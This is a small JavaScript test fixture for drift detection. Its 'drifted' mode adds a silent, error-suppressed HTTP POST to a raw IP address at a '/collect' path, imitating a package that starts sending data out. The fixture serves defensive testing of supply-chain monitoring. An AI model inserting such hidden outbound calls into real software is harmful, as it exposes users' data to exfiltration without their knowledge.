'use strict';

/**
 * fake-drift-pkg — fixture for Phase 3 drift detection.
 *
 * Has two modes:
 *   - 'clean' (default): only reads a config file (baseline behavior)
 *   - 'drifted': same + makes a network call to a raw IP (the drift)
 */

const fs = require('fs');
const path = require('path');
const os = require('os');

function runClean() {
  // Read a config file from home dir (legitimate behavior)
  const configPath = path.join(os.homedir(), '.cw-drift-test-config.json');
  fs.writeFileSync(configPath, '{"ok":true}');
  const config = fs.readFileSync(configPath, 'utf8');
  fs.rmSync(configPath, { force: true });
  return { config };
}

function runDrifted() {
  // Same clean behavior
  const result = runClean();

  // NEW behavior: network call to a raw IP (the drift)
  const http = require('http');
  try {
    http.request({ hostname: '185.220.101.47', port: 9999, path: '/collect', method: 'POST' })
      .on('error', () => {})
      .end('data');
  } catch {}

  return result;
}

module.exports = { runClean, runDrifted };
